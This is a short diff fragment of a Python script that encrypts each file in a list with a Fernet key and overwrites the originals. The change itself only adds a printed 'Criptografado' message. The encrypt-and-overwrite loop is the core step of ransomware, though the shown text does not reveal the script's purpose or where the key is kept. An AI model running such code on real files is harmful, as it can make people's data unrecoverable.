@@ -21,3 +21,5 @@ for file in files:
     conteudo_encrypted = Fernet(key).encrypt(conteudo)
     with open(file, "wb") as arquivo:
         arquivo.write(conteudo_encrypted)
+
+print("Criptografado")
